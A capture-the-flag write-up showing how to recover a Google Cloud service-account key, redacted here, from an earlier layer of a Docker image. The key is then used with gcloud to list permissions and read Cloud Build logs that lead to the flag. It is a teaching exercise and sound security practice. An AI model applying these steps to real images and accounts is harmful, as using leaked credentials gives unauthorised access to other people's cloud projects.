# Out of the Container

## Analysis

The problem asks us to download a Docker image named `windex123/config-tester` and check it out. If we attempt to download it using `docker pull windex123/config-tester`, we will get an error that the tag `latest` has not been found. This is our first obstacle.

## Solution

First, we need to access [Docker Hub](https://hub.docker.com/) and look for the image by its name. If we list the available tags, we will see it only contains a tag `v1`. So, in order to properly download the image, we need to use:

```bash
$ docker pull windex123/config-tester:v1
```

Now the image will download successfully and we can run it using:

```bash
$ docker run --rm -it windex123/config-tester:v1 /bin/sh
```

This will spawn a shell inside the container connect us to it. However, if we analyze the system, we will not find anything out of the ordinary: no flag file, no program running, no processes, no different users, or anything like it.

The real place we should be looking at is the previous _layers_ of the Docker image. When a Docker image is build, Docker uses the definitions on the `Dockerfile` to create multiple layers. Each layer is built on top of the previous one, and applying all these layers in sequence gives us the final image.

We can inspect the layers of a downloaded image by doing:

```bash
$ docker inspect windex123/config-tester:v1 -f '{{.RootFS.Layers}}'

[
    sha256:613e5fc506b927aeaaa9c9c3dc26c0971686e566ce4cab4c4c3181f868061c60
    sha256:f2fb314de264f2aa452d84053af3e2a6b086d464d9e12fc6490bbea3818079d3
    sha256:6bca1b5b845e3e363047510182121b7f44083bcbef560052bdc46daa2bcee03e
    sha256:d9e1433d65ee39dc945c396aff64d8771a770e9bf5c98845676109c60d2ac975
]
```

This will give us all of the layers of the image identified by their `SHA256` hashes. We can save the contents of each of the layers by doing:

```bash
$ docker save windex123/config-tester:v1 -o out.tar
$ tar -xf out.tar
```

This will give us multiple files about the image as well as a folder called `blobs/`. Inside of this folder there are files corresponding to the layers of the image. Each of these files is itself a `.tar` archive:

```bash
$ file 613e5fc506b927aeaaa9c9c3dc26c0971686e566ce4cab4c4c3181f868061c60 

613e5fc506b927aeaaa9c9c3dc26c0971686e566ce4cab4c4c3181f868061c60: POSIX tar archive (GNU)
```

That means we can inspect their contents by doing:

```bash
$ tar tvf 613e5fc506b927aeaaa9c9c3dc26c0971686e566ce4cab4c4c3181f868061c60

drwxr-xr-x  0 0      0           0 Sep 26 18:31 ./
drwxr-xr-x  0 0      0           0 Sep 26 18:31 bin/
-rwxr-xr-x  0 0      0     1119784 Sep 26 18:31 bin/[
hrwxr-xr-x  0 0      0           0 Sep 26 18:31 bin/[[ link to bin/[
hrwxr-xr-x  0 0      0           0 Sep 26 18:31 bin/acpid link to bin/[
hrwxr-xr-x  0 0      0           0 Sep 26 18:31 bin/add-shell link to bin/[
hrwxr-xr-x  0 0      0           0 Sep 26 18:31 bin/addgroup link to bin/[
hrwxr-xr-x  0 0      0           0 Sep 26 18:31 bin/adduser link to bin/[
hrwxr-xr-x  0 0      0           0 Sep 26 18:31 bin/adjtimex link to bin/[
[...]
```

While the first layer (`613e5...`) is going to have a lot of files, if we look at the second layer (`f2fb314...`) we will see the following:

```
drwxrwxrwt  0 0      0           0 Dec 28 13:11 tmp/
-rw-r--r--  0 0      0        2394 Dec 28 13:10 tmp/config.json
-rw-r--r--  0 0      0          15 Dec 28 13:08 tmp/config.txt
```

This looks promising. If we extract the contents of this archive we will get the two files:

```bash
$ tar xf f2fb314...
$ cd tmp/
$ cat config.txt

hi im a config!

$ cat config.json

{
  "type": "service_account",
  "project_id": "uoftctf-2025-docker-chal",
  "private_key_id": "<PRIVATE KEY ID>",
  "private_key": "<PRIVATE KEY HERE>",
  "client_email": "docker-builder@uoftctf-2025-docker-chal.iam.gserviceaccount.com",
  [...]
}
```

As we can see, while the `.txt` file doesn't give us much, the `.json` file contains a JSON object representing a service account for a project named `uoftctf-2025-docker-chal`. More specifically, this is a config file for connecting to Google Cloud.

We can connect to this account using the `gcloud` CLI tool:

```bash
$ gcloud auth activate-service-account docker-builder@uoftctf-2025-docker-chal.iam.gserviceaccount.com --key-file=config.json
```

Now we have access to an entire Google Cloud project. In order to reduce the surface area, we should list the IAM permissions this service account has for the current project:

```bash
$ gcloud projects get-iam-policy uoftctf-2025-docker-chal
```

We will see that this service account has permission to list its IAM policies (like we just did), read artifacts, and read `Cloud Builds`. We can list the cloud builds for this account using:

```bash
$ gcloud builds list
```

We will see that there are a few of these listed. We can pick one of them and list its logs by doing:

```bash
$ gcloud builds log ${BUILD-ID}
```

In one of the builds, with ID `4a4bbc46-5a8b-4d36-a23f-39366ab2eac7`, we will find logs that refer to cloning a repository at the address [`https://github.com/OverjoyedValidity/countdown-timer.git`](https://github.com/OverjoyedValidity/countdown-timer.git). In it, there is a single file containing the flag:

```
uoftctf{out-of-the-bucket3}
```